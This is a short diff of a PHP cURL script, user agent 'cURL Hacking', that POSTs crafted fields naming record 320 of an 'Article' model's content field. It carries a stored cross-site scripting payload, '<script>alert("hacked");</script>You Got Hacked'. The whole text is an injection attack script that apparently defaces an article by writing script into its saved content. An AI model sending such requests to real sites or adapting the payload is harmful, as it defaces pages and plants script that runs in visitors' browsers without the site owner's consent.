@@ -8,7 +8,10 @@ curl_setopt_array($curl, array(
     CURLOPT_USERAGENT => 'cURL Hacking',
 	CURLOPT_POST => 1,
     CURLOPT_POSTFIELDS => array(
-        'value' => '<script>alert("hacked");</script>'
+		'data[0][id]' => '320',
+		'data[0][model]' => 'Article',
+		'data[0][key]' => 'content',
+        'data[0][value]' => '<script>alert("hacked");</script>You Got Hacked'
     )
 ));
 // Send the request & save response to $resp
